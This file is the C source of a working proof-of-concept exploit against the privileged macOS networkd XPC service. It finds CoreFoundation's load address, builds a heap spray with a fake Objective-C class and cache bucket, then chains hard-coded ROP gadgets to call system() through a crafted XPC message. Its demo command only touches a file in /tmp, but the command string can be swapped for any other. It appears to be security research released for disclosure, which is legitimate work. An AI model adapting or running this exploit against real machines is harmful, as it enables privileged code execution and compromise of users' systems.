// Requires Lorgnette: https://github.com/rodionovd/liblorgnette
// clang -o networkd_exploit networkd_exploit.c liblorgnette/lorgnette.c -framework CoreFoundation
// ianbeer
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/task.h>

#include <mach-o/dyld_images.h>

#include "liblorgnette/lorgnette.h"

/* find the base address of CoreFoundation for the ROP gadgets */

void* find_library_load_address(const char* library_name){
  kern_return_t err;

  // get the list of all loaded modules from dyld
  // the task_info mach API will get the address of the dyld all_image_info struct for the given task
  // from which we can get the names and load addresses of all modules
  task_dyld_info_data_t task_dyld_info;
  mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
  err = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);

  const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
  const struct dyld_image_info* image_infos = all_image_infos->infoArray;
  
  for(size_t i = 0; i < all_image_infos->infoArrayCount; i++){
    const char* image_name = image_infos[i].imageFilePath;
    mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
    if (strstr(image_name, library_name)){
      return (void*)image_load_address;
    }
  }
  return NULL;
}


struct heap_spray {
  void* fake_objc_class_ptr; // -------+
  uint8_t pad0[0x10];        //        |
  uint64_t first_gadget;     //        |
  uint8_t pad1[0x8];         //        |
  uint64_t null0;            //        |
  uint64_t pad3;             //        |
  uint64_t pop_rdi_rbp_ret;  //        |
  uint64_t rdi;              //        |
  uint64_t rbp;              //        |
  uint64_t system;           //        |
  struct fake_objc_class_t { //        |
    char pad[0x10];      // <----------+
    void* cache_buckets_ptr; //--------+
    uint64_t cache_bucket_mask;  //    |
  } fake_objc_class;             //    |
  struct fake_cache_bucket_t {   //    |
    void* cached_sel;      // <--------+  //point to the right selector
    void* cached_function; // will be RIP :)
  } fake_cache_bucket;
  char command[256];
};

xpc_connection_t connect(){
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.networkd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);
  return conn;
}

void go(){
  void* heap_spray_target_addr = (void*)0x120202000;
  struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
  memset(hs, 'C', 0x1000);
  hs->null0 = 0;
  hs->fake_objc_class_ptr = &hs->fake_objc_class;
  hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
  hs->fake_objc_class.cache_bucket_mask = 0;

  // nasty hack to find the correct selector address :)
  uint8_t* ptr = (uint8_t*)lorgnette_lookup(mach_task_self(), "_dispatch_objc_release");
  uint64_t* msgrefs = ptr + 0x1a + (*(int32_t*)(ptr+0x16)); //offset of rip-relative offset of selector 
  uint64_t sel = msgrefs[1];
  printf("%p\n", sel);
  hs->fake_cache_bucket.cached_sel = sel;

  uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
  // pivot:
/*
push rax
add eax, [rax]
add [rbx+0x41], bl
pop rsp
pop r14
pop r15
pop rbp
ret
*/
  hs->fake_cache_bucket.cached_function = CoreFoundation_base + 0x46ef0; //0x414142424343; // ROP from here

  // jump over the NULL then so there's more space:
  //pop, pop, pop, ret: //and keep stack correctly aligned
  hs->first_gadget = CoreFoundation_base + 0x46ef7;

  hs->pop_rdi_rbp_ret = CoreFoundation_base + 0x2226;
  hs->system = dlsym(RTLD_DEFAULT, "system");

  hs->rdi = &hs->command;
  strcpy(hs->command, "touch /tmp/hello_networkd");


  size_t heap_spray_pages = 0x40000;
  size_t heap_spray_bytes = heap_spray_pages * 0x1000;
  char* heap_spray_copies = malloc(heap_spray_bytes);
  for (int i = 0; i < heap_spray_pages; i++){
    memcpy(heap_spray_copies+(i*0x1000), hs, 0x1000);
  }

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);

  xpc_dictionary_set_data(msg, "heap_spray", heap_spray_copies, heap_spray_bytes);

  xpc_dictionary_set_uint64(msg, "type", 6);
  xpc_dictionary_set_uint64(msg, "connection_id", 1);

  xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
  xpc_object_t conn_list = xpc_array_create(NULL, 0);
  
  xpc_object_t arr_dict = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_string(arr_dict, "hostname", "example.com");

  xpc_array_append_value(conn_list, arr_dict);
  xpc_dictionary_set_value(params, "connection_entry_list", conn_list);
  
  char* long_key = malloc(1024);
  memset(long_key, 'A', 1023);
  long_key[1023] = '\x00';

  xpc_dictionary_set_string(params, long_key, "something or other that's not important");

  uint64_t uuid[] = {0, 0x120200000};
  xpc_dictionary_set_uuid(params, "effective_audit_token", (const unsigned char*)uuid);
  xpc_dictionary_set_uint64(params, "start", 0);
  xpc_dictionary_set_uint64(params, "duration", 0);
  
  xpc_dictionary_set_value(msg, "parameters", params);

  xpc_object_t state = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_int64(state, "power_slot", 0);
  xpc_dictionary_set_value(msg, "state", state);

  xpc_object_t conn = connect();
  printf("connected\n");

  xpc_connection_send_message(conn, msg);
  printf("enqueued message\n");

  xpc_connection_send_barrier(conn, ^{printf("other side has enqueued this message\n");});

  xpc_release(msg);
}

int main(){
  go();
  printf("entering CFRunLoop\n");
  for(;;){
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, DBL_MAX, TRUE);
  }
  
  return 0;
}
